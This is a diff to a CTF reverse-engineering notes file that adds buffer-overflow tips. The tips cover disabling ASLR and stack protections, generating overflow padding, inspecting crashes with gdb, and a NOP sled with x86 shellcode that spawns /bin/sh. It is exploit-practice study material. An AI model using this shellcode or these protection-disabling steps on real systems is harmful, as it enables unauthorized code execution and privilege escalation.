@@ -28,11 +28,34 @@ Reverse engineering 9447_stuff
 
 #==============================
 # Tips
+#------------------------------CONFIGURE
 
-#------------------------------print
-python -c "print 'A'*30"
+sudo sysctl -w kernel.randomize_va_space=0				#ASLR
+
+gcc -fno-stack-protector -o test test.c					#Stack protector
+
+gcc -fno-stack-protector -z execstack -o test test.c    #exectuable stack
+
+
+#------------------------------ADDRESS
+
+
+
+dmesg | tail -1
+
+#------------------------------PRINT
+python -c "print 'A'*30"						# \x0A
 printf "AAAAAAAAAAA"
+perl -e 'print "\x41"x20 . "\x31\x31\x31\x31"'  # without \x0A
 
+
+
+#------------------------------FILE
+python -c "print 'A'*256 + 'B'*4 + 'C'*4+'D'*4 +'E'*4 +'F'*4"|sed s/\\n// >temp
+
+
+#------------------------------ARGUMENT
+./foo "$(< file.txt)"
 
 #------------------------------STDIN
 cat filename - | nc localhost 5000
@@ -41,7 +64,15 @@ cat filename - | nc localhost 5000
 
 
 
+#------------------------------GDB
+x/40x $esp
+x/3i *0x41414141
 
+
+
+
+#------------------------------SHELL
+`perl -e 'print "\x90"x990 . "\x31\xC0\xB0\x46\x31\xDB\x31\xC9\xCD\x80\xEB\x16\x5B\x31\xC0\x88\x43\x07\x89\x5B\x08\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D\x53\x0C\xCD\x80\xE8\xE5\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68" . "\x00\x00\x00\x00"'`
 
 #==============================
 
